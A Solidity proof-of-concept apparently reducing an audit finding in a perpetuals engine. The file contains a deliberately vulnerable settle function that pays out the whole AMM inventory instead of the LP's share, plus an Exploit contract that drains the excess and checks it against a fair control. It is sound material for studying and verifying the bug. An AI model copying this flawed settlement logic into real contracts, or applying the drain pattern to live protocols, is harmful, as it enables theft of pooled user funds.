// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vertex PerpEngine — settlement credits the whole AMM, not the LP share (OtterSec, 48378)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: position PnL adds ammBase and ammQuote in full. Only amountLp/supply of
    that inventory belongs to the settler. */

contract MockERC20 {
    string public name = "Quote";
    string public symbol = "vQUOTE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

library MathHelper {
    function mul(int256 a, int256 b) internal pure returns (int256) {
        return a * b / 1e18;
    }
}

contract PerpEngine {
    using MathHelper for int256;

    struct Balance {
        int256 amountX18;
        int256 vQuoteBalanceX18;
        int256 amountLp;
    }

    MockERC20 public quoteToken;
    int256 public supply = 100e18;
    int256 public ammBaseX18 = 100e18;
    int256 public ammQuoteX18 = 100e18;
    mapping(address => Balance) public balances;

    constructor(MockERC20 q) {
        quoteToken = q;
    }

    function depositLp(address trader, int256 amountLp) external {
        balances[trader].amountLp = amountLp;
    }

    function settle(address trader, int256 priceX18) external returns (int256 positionPnlX18) {
        Balance memory balance = balances[trader];
        // @> VULN: adds the entire AMM base and quote, not amountLp/supply of the pool
        positionPnlX18 = priceX18.mul(balance.amountX18 + ammBaseX18) + balance.vQuoteBalanceX18 + ammQuoteX18;
        require(positionPnlX18 > 0, "pnl");
        quoteToken.transfer(trader, uint256(positionPnlX18));
    }

    function fairPnl(address trader, int256 priceX18) public view returns (int256) {
        Balance memory balance = balances[trader];
        int256 shareBase = ammBaseX18 * balance.amountLp / supply;
        int256 shareQuote = ammQuoteX18 * balance.amountLp / supply;
        return priceX18.mul(balance.amountX18 + shareBase) + balance.vQuoteBalanceX18 + shareQuote;
    }

    function settleFair(address trader, int256 priceX18) external returns (int256 pnl) {
        pnl = fairPnl(trader, priceX18);
        require(pnl > 0, "fair");
        quoteToken.transfer(trader, uint256(pnl));
    }
}

contract Exploit {
    MockERC20 public quoteToken; // nonce 1
    PerpEngine public engine; // nonce 2
    PerpEngine public fairEngine; // nonce 3

    uint256 public paid;
    uint256 public fair;
    uint256 public extra;
    uint256 public controlPaid;

    constructor() {
        quoteToken = new MockERC20();
        engine = new PerpEngine(quoteToken);
        fairEngine = new PerpEngine(quoteToken);
        quoteToken.mint(address(engine), 200e18);
        quoteToken.mint(address(fairEngine), 20e18);
    }

    function run() external {
        engine.depositLp(address(this), 10e18);
        int256 priceX18 = 1e18;
        int256 pnl = engine.settle(address(this), priceX18);
        paid = uint256(pnl);
        fair = uint256(engine.fairPnl(address(this), priceX18));
        extra = paid - fair;
        require(paid == 200e18, "paid");
        require(fair == 20e18, "fair");
        require(extra == 180e18, "extra");
        require(quoteToken.balanceOf(address(this)) == paid, "received");

        fairEngine.depositLp(address(this), 10e18);
        controlPaid = uint256(fairEngine.settleFair(address(this), priceX18));
        require(controlPaid == 20e18, "control");
    }
}
